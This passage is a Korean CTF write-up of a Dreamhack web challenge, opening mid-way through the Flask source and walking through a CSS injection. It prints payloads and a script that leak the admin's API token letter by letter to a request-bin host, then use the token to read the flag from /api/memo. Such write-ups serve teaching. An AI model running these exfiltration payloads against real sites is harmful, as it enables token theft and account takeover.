            <span class="n">memo</span><span class="p">.</span><span class="nf">append</span><span class="p">({</span><span class="sh">"</span><span class="s">idx</span><span class="sh">"</span><span class="p">:</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="sh">"</span><span class="s">memo</span><span class="sh">"</span><span class="p">:</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">2</span><span class="p">]})</span>
        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="sh">"</span><span class="s">memo</span><span class="sh">"</span><span class="p">:</span> <span class="n">memo</span><span class="p">}</span>

    <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span> <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Error !</span><span class="sh">"</span><span class="p">}</span>

<span class="c1"># For Challenge
</span><span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
    <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">DROP TABLE IF EXISTS users;</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">execute</span><span class="p">(</span>
        <span class="sh">"""</span><span class="s">
        CREATE TABLE users (
            uid INTEGER PRIMARY KEY,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            token TEXT NOT NULL UNIQUE
        );
    </span><span class="sh">"""</span>
    <span class="p">)</span>

    <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">DROP TABLE IF EXISTS memo;</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">execute</span><span class="p">(</span>
        <span class="sh">"""</span><span class="s">
        CREATE TABLE memo (
            idx INTEGER PRIMARY KEY,
            uid INTEGER NOT NULL,
            text TEXT NOT NULL
        );
    </span><span class="sh">"""</span>
    <span class="p">)</span>

    <span class="c1"># Add admin
</span>    <span class="nf">execute</span><span class="p">(</span>
        <span class="sh">"</span><span class="s">INSERT INTO users (username, password, token)</span><span class="sh">"</span>
        <span class="sh">"</span><span class="s">VALUES (:username, :password, :token);</span><span class="sh">"</span><span class="p">,</span>
        <span class="p">{</span>
            <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADMIN_USERNAME</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">ADMIN_PASSWORD</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">(),</span>
            <span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span> <span class="nf">token_generate</span><span class="p">(),</span>
        <span class="p">},</span>
    <span class="p">)</span>

    <span class="n">adminUid</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span>
        <span class="sh">"</span><span class="s">SELECT * FROM users WHERE username = :username;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADMIN_USERNAME</span><span class="p">}</span>
    <span class="p">)</span>

    <span class="c1"># Add FLAG
</span>    <span class="nf">execute</span><span class="p">(</span>
        <span class="sh">"</span><span class="s">INSERT INTO memo (uid, text)</span><span class="sh">"</span> <span class="sh">"</span><span class="s">VALUES (:uid, :text);</span><span class="sh">"</span><span class="p">,</span>
        <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">adminUid</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">FLAG is </span><span class="sh">"</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">},</span>
    <span class="p">)</span>

<span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="nf">app_context</span><span class="p">():</span>
    <span class="nf">init</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
</pre>
</details></br>

> 코드가 너무 길어서 `<details>` 태그로 넣었지만 code formatter이 작동을 안하네요. 참고 부탁드립니다.
{: .prompt-warning}

#### check_url()
```python
driver_promise = Promise(driver.get("http://127.0.0.1:8000/login"))
driver_promise.then(
	driver.find_element(By.NAME, "username").send_keys(str(ADMIN_USERNAME))
)
driver_promise.then(
	driver.find_element(By.NAME, "password").send_keys(ADMIN_PASSWORD.decode())
)
driver_promise = Promise(driver.find_element(By.ID, "submit").click())
driver_promise.then(driver.get(url))
```
`check_url()` 함수는 /report 페이지에서 subpath 입력을 받고 처리해주는 역할을 한다.<br />
중간 부분의 코드를 보면 "127.0.0.1:8000" 주소에 admin 아이디로 로그인을 하고 그 다음에 유저가 입력한 URL로 입력하는 것을 볼 수 있다.
#### init()
```python
adminUid = execute(
	"SELECT * FROM users WHERE username = :username;", {"username": ADMIN_USERNAME}
)

# Add FLAG
execute(
	"INSERT INTO memo (uid, text)" "VALUES (:uid, :text);",
	{"uid": adminUid[0][0], "text": "FLAG is " + FLAG},
)
```
서버가 실행될 때 DB를 초기화해주는 `init()` 함수도 보면 플래그 값이 admin 아이디의 memo로 저장이 되는 것을 알 수 있다.<br />
다시 말해서 admin 아이디로 memo 창에 접근하면 문제를 해결할 수 있다.
#### background_color()
```python
@app.context_processor
def background_color():
    color = request.args.get("color", "white")
    return dict(color=color)
```
중간에 보면 flask의 context_processor 함수가 보인다.<br />
Flask에서 탬플릿을 랜더링 할 때 항상 자동으로 실행되는 함수를 의미한다.<br />
URL로부터 "color" 값을 받고 이를 CSS에 적용하는 것 같다. 아무것도 전달되지 않으면 하얀색으로 설정된다.<br />

```css
body{
	background-color: white;
}
```
해당 문제 사이트의 모든 페이지를 보면 body 태그 내부에 위와 같은 style 태그가 들어있다.<br />
`http://host3.dreamhack.games:12126/login?color=black` 이런식으로 아무 페이지에 color 값을 전달하면 정말로 색깔이 변화하는 것을 볼 수 있다.<br />
#### APImemo()
```python
def apikey_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.headers.get("API-KEY", None)
        token = execute("SELECT * FROM users WHERE token = :token;", {"token": apikey})
        if token:
            request.uid = token[0][0]
            return view(**kwargs)
        return {"code": 401, "message": "Access Denined !"}

    return wrapped_view

@app.route("/api/memo")
@apikey_required
def APImemo():
    memos = execute("SELECT * FROM memo WHERE uid = :uid;", {"uid": request.uid})
    if memos:
        memo = []
        for tmp in memos:
            memo.append({"idx": tmp[0], "memo": tmp[2]})
        return {"code": 200, "memo": memo}

    return {"code": 500, "message": "Error !"}
```
해당 서버에는 api도 존재하는데 이 부분에서는 로그인을 체크하지않고 단순하게 요청 헤더에서 `API-KEY`만 읽어내어 권한을 체크한다.<br />
## 최종 풀이
우리가 일단 color 값을 전달함으로써 CSS를 조작할 수 있다는 것을 알게됐다.<br />
이제 color 뿐만 아니라 다른 값도 전달이 가능한지 테스트를 하기 위한 페이로드를 작성해보았다.<br />

```
http://host3.dreamhack.games:12126/memo?color=yellow;%20font-size:%20100px;
```
이렇게 `color=yellow;` 다음에 font-size를 건드려보니 실제로 적용되는 것이 확인됐다.<br />
이로써 우리는 CSS injection 취약점이 발생한다는 것을 확신할 수 있다.<br />
### CSS Injection으로 값 읽어오기
값을 읽어오기 이전에 우선 어떠한 값을 읽어야하는지 확정해야한다.<br />
원래는 /report 페이지를 통해서 /memo 페이지에 CSS 코드를 보내서 플래그 값을 읽으려했지만 딱히 방법이 없었다.<br /> memo가 모두 div 태그로 작성돼있기 때문이다.<br />

CSS Injection으로는 "input" 값을 읽어올 수 있는 방법이 존재한다. <br />
아무 아이디로 로그인 후 /mypage에 들어가보면 만 아래에 해당 아이디의 API Token가 적혀있는데 해당 값은 input으로 적혀있기 때문에 CSS로 값을 읽을 수 있다.
#### 테스트
```css
/mypage?color=yellow;} input[id=InputApitoken][value^=a] {background: url(https://rlmheje.request.dreamhack.games?data=a)
```
페이로드를 이런식으로 작성해서 /mypage의 API 토큰 값을 하나씩 읽어낼 수 있다. `[value^=a]` 부분의 'a'를 계속 바꿔가면서 화면을 확인해보면 올바른 값이 입력됐을 때 해당 인풋 박스의 색깔이 변하는 것을 확인할 수 있다.<br />
예를 들어 API 토큰 값이 "abcdefgh"라고 가정한다면 `[value^=a]`를 입력했을 때 색이 변하고 `[value^=ab]`를 입력했을 때 색이 변한다. 이런식으로 색이 변하는 한 글자를 총 8번 반복하여 최종 토큰을 알아내면 된다.
#### API 토큰의 길이
```python
def token_generate():
    while True:
        token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
        token_exists = execute(
            "SELECT * FROM users WHERE token = :token;", {"token": token}
        )
        if not token_exists:
            return token
```
main.py를 다시 보면 토큰을 생성하는 함수가 있다. <br />
토큰은 알파벳 소문자로만 이루어져있고 총 8자리이다.
#### 익스플로잇 코드
```python
import requests
import string 

url = "http://host3.dreamhack.games:15984/report"
ping_back_url = "https://qfqwunp.request.dreamhack.games?data="

alphabets = string.ascii_lowercase

for letter in alphabets:
    token = "" + letter
    path = f"/mypage?color=white;"+ "}" + f"input[id=InputApitoken][value^={token}]" +  "{" + f"background: url({ping_back_url}{token})" + "}"
    print(token)
```
익스플로잇은 위와 같다.<br />

해당 코드는 /report 페이지에 서브 URL을 POST 요청으로 보내는데 당연하게도 서브 URL에는 CSS 인젝션 코드가 들어가게 된다.<br />
토큰 한 글자 한 글자 시도해가며 만약 올바른 글자로 요청이 갔다고 한다면 ping_back_url로 해당 값을 보내주는 방식으로 동작한다.<br />

만일 토큰이 "bcdesfde"라고 하면 "b"가 입력됐을 때 드림핵의 Requests Bin에 ?data=b가 전달되는 방식이다. 참고로 글자 8개 모두 자동으로 알아내게끔 구현은 돼있지 않다.<br />
한 글자를 알아낼 때마다 내가 for문 안의 token 값을 직접 업데이트 해주어야한다.<br />
input 박스의 색깔이 변화한 것을 DOM을 통해서 추출해내면서 완전히 자동화 할 수도 있겠지만 귀찮아서 하지 않았다.
#### /api/memo 접근
```python
@app.route("/api/memo")
@apikey_required
def APImemo():
    memos = execute("SELECT * FROM memo WHERE uid = :uid;", {"uid": request.uid})
    if memos:
        memo = []
        for tmp in memos:
            memo.append({"idx": tmp[0], "memo": tmp[2]})
        return {"code": 200, "memo": memo}

    return {"code": 500, "message": "Error !"}
```
/api/memo 코드를 다시 한 번 살펴보면, uid 값을 URL로부터 받고 해당 아이디의 메모를 모두 출력해주는 API이다.<br />
하지만 해당 페이지에 접속할 때 `@apikey_required`로 API 키를 확인하는 과정이 있다. API 키는 header로 받게끔 돼있다.(모르겠다면 전체 코드를 다시 살펴보는 것을 권한다)<br />

```python
resp = requests.get("http://host3.dreamhack.games:15984/api/memo?uid=administrator", headers={"API-KEY": "REDACTED"})
print(resp.text)
```
최종적으로 이런식으로 API-KEY 값을 헤더로 전달하면 결과로 플래그가 포함된 admin의 메모를 보여준다.
# 배운 것
해당 문제를 풀면서 강의로 공부했던 CSS Injection을 실습할 수 있어서 좋았다.<br />
배울 때와는 다르게 실제로 문제를 풀다보면 별의 별 일로 삽질을 다 하는데 그러면서 많이 배운다.<br />

ping-back 기법을 어떻게 사용해야 작동하는지, input 박스의 값을 읽을 때 id 값을 어떻게 지정할 수 있는지 등등 공부할 수 있었다.